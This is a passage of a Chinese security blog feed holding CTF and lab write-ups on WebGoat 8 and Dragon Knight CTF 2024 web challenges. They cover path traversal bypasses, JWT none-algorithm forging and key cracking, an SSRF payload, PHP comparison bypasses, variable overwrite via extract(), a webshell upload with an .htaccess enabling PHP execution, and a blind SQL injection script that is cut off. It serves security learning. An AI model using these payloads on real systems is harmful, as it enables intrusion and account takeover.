        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在当今数字化时代，JAVA已经成为主流编程语言之一。无论是企业级应用程序还是个人项目，JAVA应用程序都承载着大量的敏感数据和业务逻辑。所以，学好对JAVA安全的防护变得尤为重要。同时，JAVA语言相对于PHP以及其他语言来说有着更高的安全性，所以如果采用JAVA语言编写的web，几乎不可能存在sql注入，面对JAVA开发的应用程序，如果要对其进行安全测试的话，一般是要拿到其源码才可以的，所以，JAVA安全是很难的，也是最有价值去研究的</p><h2 id="WebGoat8靶场搭建"><a href="#WebGoat8靶场搭建" class="headerlink" title="WebGoat8靶场搭建"></a>WebGoat8靶场搭建</h2><p>这一部分笔者折腾了很久，按照一般的教程，大家都是通过把WebGoat的jdk下载下来，然后用自己的jdk命令行打开就行，但是笔者在实操的时候发现了虽然有jdk，但是jdk版本太老了，不能带动WebGoat的运行，于是我也去升级了一下我的jdk，下了一个全新版本的jdk，然后就和我的老jdk冲突了🤬，在网上试了很多方法，都没成功，最后决定下载Docker镜像，在服务器上搭建，好在是这样成功了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9085333c7ceada5758a24d1a4d97fca4.jpg" alt="9085333c7ceada5758a24d1a4d97fca4"></p><p>按照如下方式在你的虚拟机上安装docker镜像</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0 //拉取镜像</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0 //启动镜像</span><br></pre></td></tr></table></figure><p>之后在自己的浏览器访问<code>xx.xx.xx.xx:8080/WebGoat/login</code>，其中，前面输入自己服务器的公网IP即可，出现以下页面即代表成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704095027112.png" alt="image-20240704095027112"></p><p>之后随便注册一个账户就可以登录进去，然后就可以愉快的刷题了🤩🤩🤩</p><h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h2><p>应用场景：在文件上传时，我们可能会遇到上传的路径不允许执行php或者其他木马后缀，这个时候我们可以进行路径穿越，将文件上传到上层目录或者根目录下，因为根目录不可能限制很多文件运行，如果限制文件运行，则这个项目的部分功能可能无法实现，所以进行路径穿越是很有必要的</p><p>首先我们打开pathtraversal关卡，我们可以学到一些关于pathtraversal的基本知识</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704095836603.png" alt="image-20240704095836603"></p><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>打开第一关，首先我们可以看到如下页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704100135519.png" alt="image-20240704100135519"></p><p>我们先随机上传一个头像试试，可以看到文件被放在了如下路径</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704100345392.png" alt="image-20240704100345392"></p><p>所以本题其实就是要跨越那个borgeous目录，放到上级目录，所以很简单，经典<code>../</code>即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e433b7085eb3f3211a416b240a48ab64.png" alt="e433b7085eb3f3211a416b240a48ab64"></p><p>所以只需要加一个<code>../</code>就可以完成路径穿越</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>看第二关，同样很简单，只是禁用了<code>../</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704101002388.png" alt="image-20240704101002388"></p><p>我们同样先测试一下是怎么过滤<code>../</code>的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c5f382c3b0664614c3b9399208d5532a.png" alt="c5f382c3b0664614c3b9399208d5532a"></p><p>很容易看出，这个时候输入<code>../</code>已经没什么用了，显然被过滤了，我们先试试能不能进行编码绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5bdf5166643798a6991238796e61cc39.png" alt="5bdf5166643798a6991238796e61cc39"></p><p>很显然，编码绕过没有什么作用，我们试试双写绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704101523097.png" alt="image-20240704101523097"></p><p>显然，双写绕过是可以的</p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>首先观察提示，发现又进行了一些修复，对<code>Full name</code>字段又进行了部分限制，我们仍然通过抓包看看有没有什么有用的信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704101816226.png" alt="image-20240704101816226"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240705104345316.png" alt="image-20240705104345316"></p><p>发现这里把<code>1.jpg</code>传进去了，我们对filename字段进行路径穿越即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/af6d8bcd800db1b0653467a492fcf57b.png" alt="af6d8bcd800db1b0653467a492fcf57b"></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704102708894.png" alt="image-20240704102708894"></p><p>很明显，是让我们在路径上进行目录穿越，找到<code>path-traversal-secret.jpg</code>，老样子，先抓个包</p><p>通过不停的抓包放包，可以发现图片是用id字段进行拼接的，所以我们只需要将我们需要访问的图片和id进行拼接即可，但要注意要进行编码绕过，因为其过滤了相关特殊字符</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704103902329.png" alt="image-20240704103902329"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704104144759.png" alt="image-20240704104144759"></p><p>成功解出本关</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="认证问题"><a href="#认证问题" class="headerlink" title="认证问题"></a>认证问题</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704162404083.png" alt="image-20240704162404083"></p><p>当我们忘记密码时，出现这个回答问题是非常正常的，但是当管理员对问题的设置不当时，就会引发很严重的安全问题，比如通过更改键名来进行非法绕过，而这一关所考察的问题也是这个</p><p>首先我们随便输入，然后用bp抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704162617615.png" alt="image-20240704162617615"></p><p>当把键值改为不存在的键值时，此时系统查找数据库发现没有这一项，进而无论输入什么都会返回正确，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/ed937140ac81374d683d2fbad26144cb.png" alt="ed937140ac81374d683d2fbad26144cb"></p><p>但是如果管理员将键名固定，只接受键值，那么这种方法是不可行的，需要其他的方法</p><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT是一种身份鉴别手段，经常用在java和python中，对于jwt的详解可以参考以下这篇文章</p><p><a href="https://blog.csdn.net/qq_46081990/article/details/135128438">JWT介绍&amp;空加密&amp;暴破密钥&amp;私钥泄露&amp;密钥混淆&amp;黑盒_jwt泄露-CSDN博客</a></p><p>对于jwt，比较常用的方法就是空加密和密钥爆破，我们还是用例题来进行讲解</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704163128859.png" alt="image-20240704163128859"></p><p>对于该关卡，我们需要先获得一个身份，然后提权到管理员身份即可，我们先用bp进行抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704163314739.png" alt="image-20240704163314739"></p><p>我们将access_token字段拿去解密，解密出来的结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704163428515.png" alt="image-20240704163428515"></p><p>我们只需要将false改为true，并把算法置为none即可，我们使用相关脚本进行生成（在线网站是生成不了的），这里推荐jw_tool进行生成</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用None算法</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -X a</span><br><span class="line"><span class="comment"># 自定义修改生成</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -T</span><br><span class="line"><span class="comment"># 使用字典破解</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt</span><br><span class="line"><span class="comment"># 指定密码测试</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -p password_here</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704164411540.png" alt="image-20240704164411540"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704164620461.png" alt="image-20240704164620461"></p><p>根据其提示一步一步往下操作，最终将得到的去掉最后signature部分，重新发包即可</p><h3 id="JWT-Crack"><a href="#JWT-Crack" class="headerlink" title="JWT_Crack"></a>JWT_Crack</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704172225046.png" alt="image-20240704172225046"></p><p>首先题目中给了我们一串jwt加密后的信息，根据题目信息，我们首先要把username换成WebGoat后进行加密，所以我们首先需要知道密钥</p><p>查看源码，将下列secret加入我们的字典中，然后进行爆破</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704173854039.png" alt="image-20240704173854039"></p><p>用jwt_tools爆破密钥，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704173940968.png" alt="image-20240704173940968"></p><p>我们找到了正确的密钥，然后根据正确的密钥重新生成jwt即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240704174049541.png" alt="image-20240704174049541"></p><p>同时，注意将exp字段改大一点，exp表示的是jwt失效时间，否则会提示invalid</p><h2 id="第三方组件"><a href="#第三方组件" class="headerlink" title="第三方组件"></a>第三方组件</h2><p>Java安全问题80%都出在组件安全上，主要是因为JAVA会导入很多个外部包，这就导致容易因为组件爆出漏洞进而影响整个JAVA应用受到影响，比较出名的就是log4j漏洞</p><p>组件安全比较复杂，后期和其他通用漏洞一起总结</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路径穿越 </tag>
            
            <tag> JWT </tag>
            
            <tag> 组件安全 </tag>
            
            <tag> 访问控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dragon Knight CTF 2024WP</title>
      <link href="/post/5868712.html"/>
      <url>/post/5868712.html</url>
      
        <content type="html"><![CDATA[<p>呃呃呃，第一次正式打的比赛吧，被虐爆了，web方向只有三道题，但是由于各种原因，只写出来了一道，后面就没太多时间去写了，这是我对本次比赛的复现，希望能给各位师傅一点帮助</p><h2 id="穿梭隐藏的密钥"><a href="#穿梭隐藏的密钥" class="headerlink" title="穿梭隐藏的密钥"></a>穿梭隐藏的密钥</h2><p>首先打开来的生态环境长这样</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605200104052.png" alt="image-20240605200104052"></p><p>老样子，F12看看有没有好东西</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0d136ce12b29ae95f29bc86844504b69.png" alt="0d136ce12b29ae95f29bc86844504b69"></p><p>访问<code>c3s4f.php</code>，看看有什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605200257911.png" alt="image-20240605200257911"></p><p>继续看源码，有一个提示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605200325702.png" alt="image-20240605200325702"></p><p>这很明显是要让我们fuzz出参数名，在这里给各位师傅推荐一个好工具Arjun，在kali中<code>pip install Arjun</code>就可以安装了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605200602363.png" alt="image-20240605200602363"></p><p>很快啊，就fuzz出了一个参数<code>shell</code>，我们用GET方式提交，随便输入一个参数，得到如下页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605200802619.png" alt="image-20240605200802619"></p><p>很经典的xxf，但是无论怎么修改为127.0.0.1，都没有新的提示出来，所以我们扫一扫目录下有什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605202203442.png" alt="image-20240605202203442"></p><p>很好，有一个secret.php，显然，这里面指的秘密肯定就是这个secret.php，所以我们试着用ssrf进行攻击</p><p>payload如下：<code>c3s4f.php?shell=http://spoofed.burpcollaborator.net/secret.php</code>，具体参考这篇文章：<a href="https://lazzzaro.github.io/2020/09/03/web-SSRF/">SSRF | Lazzaro (lazzzaro.github.io)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605202648262.png" alt="image-20240605202648262"></p><p>我们成功拿到下一层的密钥和地址，访问得到源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;k4y.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DrKn&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DrKn&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>) == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;有点东西呢&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$key1</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;貌似状态不在线啊(╯_╰)&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$key1</span>])) &#123;</span><br><span class="line">    <span class="variable">$damei</span> = <span class="variable">$_GET</span>[<span class="variable">$key1</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md4&quot;</span>, <span class="variable">$damei</span>) == <span class="variable">$damei</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;又近了一步呢，宝~&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$key2</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$key3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;达咩哟~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge 3</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key2</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key3</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="variable">$key2</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="variable">$key3</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$user</span>) &gt; <span class="number">4</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$pass</span>) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;还得练&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$user</span> !== <span class="variable">$pass</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>)) &#123;  </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;还不错哦&quot;</span>.<span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>绕过都比较简单，老生常谈了</p><p>Challenge 1，file_get_contents，显然用data伪协议，<code>DrKn=data://text/plain,MSIBLG</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605203139455.png" alt="image-20240605203139455"></p><p>Challenge 2，考md4弱类型比较的绕过，搜一搜就可以找到类似的payload</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605203554834.png" alt="image-20240605203554834"></p><p>所以我们这里的payload为<code>M_ore.8=0e001233333333333334557778889</code>，很好，没有反应，想了很久，检查了很多次，唯一的可能就是<code>_</code>被过滤了，果然还真是（以后看到<code>_</code>定要长个心眼），我们用[替代<code>_</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605203917461.png" alt="image-20240605203917461"></p><p>Challenge 3，一眼丁真，数组绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605204031498.png" alt="image-20240605204031498"></p><p>终于也是写出来了，呜呜呜呜</p><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>首先dirsearch扫一波</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605214634413.png" alt="image-20240605214634413"></p><p>我们可以看到有<code>index.php.bak</code>，首先访问一下。得到源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查 cookie 中是否有 token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Back，&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//如果 upload 目录下存在$username.png文件，则显示图片</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// 显示图片，缩小图片</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;请上传您高贵的头像。&#x27;</span>;</span><br><span class="line">            <span class="comment">// 写一个上传头像的功能</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;留个言吧&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0a1747033535429d1003439e5cd7e3e0.png" alt="0a1747033535429d1003439e5cd7e3e0"></p><p>这里有extract函数，我们可以联系想到变量覆盖问题，用来伪造REMOTE_ADDR，我们构造的payload如下：<code>?_SERVER[REMOTE_ADDR]=127.0.0.1</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605215832315.png" alt="image-20240605215832315"></p><p>好好好，文件上传，先传一个php🐎，发现上传成功</p><p>由源代码，我们知道路径在<code>url/upload/$username/$filename</code>，但是我们怎么都连接不上，所以可能是<code>.htaccess</code>设置了不解析，所以我们自己上传一个<code>.htaccess</code>文件打开php解析引擎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_flag engine on<span class="comment"># 打开php解析</span></span><br><span class="line">AddType application/x-httpd-php .php<span class="comment"># 将该目录及子目录的所有文件均映射为php文件类型</span></span><br></pre></td></tr></table></figure><p>之后蚁🗡连接就行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240605223212287.png" alt="image-20240605223212287"></p><h2 id="Ezlogin"><a href="#Ezlogin" class="headerlink" title="Ezlogin"></a>Ezlogin</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240606105521433.png" alt="image-20240606105521433"></p><p>发现存在sql注入，且过滤了<code>union</code> 、<code>if</code> 、 <code>&gt;</code> 、<code>&lt;</code>  、<code>concat</code>、<code>(空格)</code>，我们使用布尔盲注，脚本参考其他师傅的，自己写不来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:30642/&quot;</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;@#$\()*+,-./:;&lt;=&gt;?[\\]^`|~_&amp;!%&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    r = s.post(url+<span class="string">&#x27;register.php&#x27;</span>,data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url+<span class="string">&#x27;login.php&#x27;</span>,data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">token</span>):</span><br><span class="line">    cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>:token&#125;</span><br><span class="line">    r = s.get(url+<span class="string">&#x27;home.php&#x27;</span>,cookies=cookies)</span><br><span class="line">    res = r.text.split(<span class="string">&#x27;&lt;div class=&quot;seached-text&quot;&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/div&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    res = res.replace(<span class="string">&#x27;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_fix</span>(<span class="params">token</span>):</span><br><span class="line">    token = <span class="built_in">bytes</span>.fromhex(token)</span><br><span class="line">    token = base64.b64decode(token)</span><br><span class="line">    token = json.loads(token)</span><br><span class="line">    <span class="comment"># print(token)</span></span><br><span class="line">    token[<span class="string">&#x27;is_admin&#x27;</span>]=<span class="number">1</span></span><br><span class="line">    token = json.dumps(token)</span><br><span class="line">    token = base64.b64encode(token.encode())</span><br><span class="line">    token = token.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">username</span>):</span><br><span class="line">    register(username)</span><br><span class="line">    token = 